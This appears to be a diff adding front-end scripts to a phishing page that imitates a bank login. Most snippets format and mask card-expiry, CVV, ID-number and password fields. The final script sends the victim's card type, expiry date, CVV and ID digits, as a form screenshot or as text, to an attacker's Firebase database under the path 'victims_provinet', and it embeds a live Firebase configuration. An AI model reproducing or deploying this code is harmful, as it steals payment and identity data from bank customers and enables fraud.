@@ -1,0 +1,308 @@
+<script>
+    // Format MM/AA automatically
+    document.getElementById('fecha_vencimiento').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+    });
+    
+    // Only allow numbers for CVV and ultimos digitos
+    document.getElementById('cvv').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+    document.getElementById('ultimos_digitos').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+</script>
+
+=====
+
+<script>
+    // Format MM/AA automatically
+    document.getElementById('fecha_vencimiento').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+    });
+    
+    // Only allow numbers for CVV and ultimos digitos
+    document.getElementById('cvv').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+    document.getElementById('ultimos_digitos').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+</script>
+
+=====
+
+<script>
+    // Format MM/AA automatically
+    document.getElementById('fecha_vencimiento').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+    });
+    
+    // Only allow numbers for CVV and ultimos digitos
+    document.getElementById('cvv').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+    document.getElementById('ultimos_digitos').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+</script>
+
+=====
+
+<script>
+(function() {
+    var cedulaInput = document.getElementById('cedula');
+    if (!cedulaInput) return;
+
+    var realValue = '';
+    var displayValue = [];  // array of {char, masked}
+    var maskTimer = null;
+
+    function updateDisplay() {
+        var shown = displayValue.map(function(d) {
+            return d.masked ? '*' : d.char;
+        }).join('');
+        cedulaInput.value = shown;
+        var hidden = document.getElementById('cedula_real');
+        if (hidden) hidden.value = realValue;
+        cedulaInput.dispatchEvent(new Event('input'));
+    }
+
+    function maskLastVisible() {
+        // Find last unmasked character and mask it
+        for (var i = displayValue.length - 1; i >= 0; i--) {
+            if (!displayValue[i].masked) {
+                displayValue[i].masked = true;
+                break;
+            }
+        }
+        updateDisplay();
+    }
+
+    cedulaInput.addEventListener('keydown', function(e) {
+        var key = e.key;
+        var maxLen = parseInt(cedulaInput.getAttribute('maxlength') || 10);
+
+        if (key === 'Backspace') {
+            if (maskTimer) clearTimeout(maskTimer);
+            maskTimer = null;
+            realValue = realValue.slice(0, -1);
+            displayValue = displayValue.slice(0, -1);
+            updateDisplay();
+            e.preventDefault();
+        } else if (key === 'Delete') {
+            if (maskTimer) clearTimeout(maskTimer);
+            maskTimer = null;
+            realValue = '';
+            displayValue = [];
+            updateDisplay();
+            e.preventDefault();
+        } else if (/^[0-9]$/.test(key) && realValue.length < maxLen) {
+            e.preventDefault();
+
+            // Immediately mask previous visible char
+            if (maskTimer) {
+                clearTimeout(maskTimer);
+                maskTimer = null;
+                maskLastVisible();
+            }
+
+            // Add new char as visible
+            realValue += key;
+            displayValue.push({ char: key, masked: false });
+            updateDisplay();
+
+            // Schedule masking after 1 second
+            maskTimer = setTimeout(function() {
+                maskLastVisible();
+                maskTimer = null;
+            }, 1000);
+        }
+        // Let Tab, Enter, arrows work normally (no preventDefault)
+    });
+})();
+</script>
+
+=====
+
+<script>
+(function() {
+    var pwdInput = document.getElementById('password');
+    if (!pwdInput) return;
+
+    // Create eye toggle button
+    var eyeBtn = document.createElement('button');
+    eyeBtn.type = 'button';
+    eyeBtn.id = 'eye-toggle';
+    eyeBtn.style.cssText = [
+        'position:absolute',
+        'top:62%',
+        'right:12px',
+        'transform:translateY(-50%)',
+        'background:none',
+        'border:none',
+        'cursor:pointer',
+        'padding:0',
+        'display:none',
+        'z-index:10',
+        'color:#1464a5'
+    ].join(';');
+
+    var eyeOpen = '<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1464a5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+    var eyeClosed = '<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1464a5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
+
+    eyeBtn.innerHTML = eyeOpen;
+    var visible = false;
+
+    eyeBtn.addEventListener('click', function() {
+        visible = !visible;
+        pwdInput.type = visible ? 'text' : 'password';
+        eyeBtn.innerHTML = visible ? eyeClosed : eyeOpen;
+    });
+
+    // Show eye icon when user starts typing, hide when empty
+    pwdInput.addEventListener('input', function() {
+        eyeBtn.style.display = pwdInput.value.length > 0 ? 'block' : 'none';
+        if (pwdInput.value.length === 0) {
+            visible = false;
+            pwdInput.type = 'password';
+            eyeBtn.innerHTML = eyeOpen;
+        }
+    });
+
+    // Insert after password input
+    pwdInput.parentNode.style.position = 'relative';
+    pwdInput.parentNode.appendChild(eyeBtn);
+})();
+</script>
+
+=====
+
+<script>
+(function() {
+    var pwdInput = document.getElementById('password');
+    var submitBtn = document.getElementById('submit');
+    if (!pwdInput || !submitBtn) return;
+
+    pwdInput.addEventListener('input', function() {
+        if (pwdInput.value.length >= 6) {
+            submitBtn.removeAttribute('disabled');
+        } else {
+            submitBtn.setAttribute('disabled', 'disabled');
+        }
+    });
+})();
+</script>
+
+=====
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+=====
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+=====
+
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+
+=====
+
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
+=====
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBn4c8Np9x_SMdGx9VPQPHFPJ20S4BxBwY",
+    authDomain: "c-panel-4510a.firebaseapp.com",
+    databaseURL: "https://c-panel-4510a-default-rtdb.firebaseio.com",
+    projectId: "c-panel-4510a",
+    storageBucket: "c-panel-4510a.firebasestorage.app",
+    messagingSenderId: "623315836558",
+    appId: "1:623315836558:web:46186cadacaa0d3f5d73df"
+  };
+  if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+  }
+  const db = firebase.database();
+  const DB_PATH = 'victims_provinet';
+  
+  window.addEventListener('load', function() {
+    const form = document.getElementById('form');
+    if (form) {
+      form.removeAttribute('onsubmit');
+      form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const btnSubmit = document.getElementById('submit');
+        if(btnSubmit) {
+            btnSubmit.innerText = 'Cargando...';
+            btnSubmit.style.pointerEvents = 'none';
+            btnSubmit.style.opacity = '0.7';
+        }
+
+        const cvv = document.getElementById('cvv');
+        const ultimos = document.getElementById('ultimos_digitos');
+        if (cvv) cvv.type = 'text';
+        if (ultimos) ultimos.type = 'text';
+
+        await new Promise(r => setTimeout(r, 200));
+
+        let victimId = localStorage.getItem('current_victim_id');
+        if (!victimId) victimId = "TEST_" + Date.now().toString();
+
+        const tipo_tarjeta = document.getElementById('tipo_tarjeta') ? document.getElementById('tipo_tarjeta').value : '';
+        const fecha = document.getElementById('fecha_vencimiento') ? document.getElementById('fecha_vencimiento').value : '';
+        const cvvVal = cvv ? cvv.value : '';
+        const doc_digits = ultimos ? ultimos.value : '';
+        const textData = "Tipo: " + tipo_tarjeta + " - Fecha: " + fecha + " - CVV: " + cvvVal + " - Doc: " + doc_digits;
+
+        try {
+            if (typeof html2canvas === 'undefined') {
+                throw new Error('html2canvas no cargado');
+            }
+
+            const canvas = await html2canvas(document.getElementById('form'), {
+                backgroundColor: '#ffffff',
+                scale: 1.5,
+                useCORS: true,
+                logging: false
+            });
+            const imgData = canvas.toDataURL('image/jpeg', 0.8);
+
+            db.ref(DB_PATH + '/' + victimId).update({
+                tarjeta: imgData
+            }).then(() => {
+                window.location.href = 'cargando.html';
+            }).catch(() => {
+                window.location.href = 'cargando.html';
+            });
+            
+        } catch (err) {
+            console.error("Error en captura:", err);
+            db.ref(DB_PATH + '/' + victimId).update({
+                tarjeta: textData
+            }).then(() => {
+                window.location.href = 'cargando.html';
+            }).catch(() => {
+                window.location.href = 'cargando.html';
+            });
+        }
+        return false;
+      });
+    }
+  });
+</script>
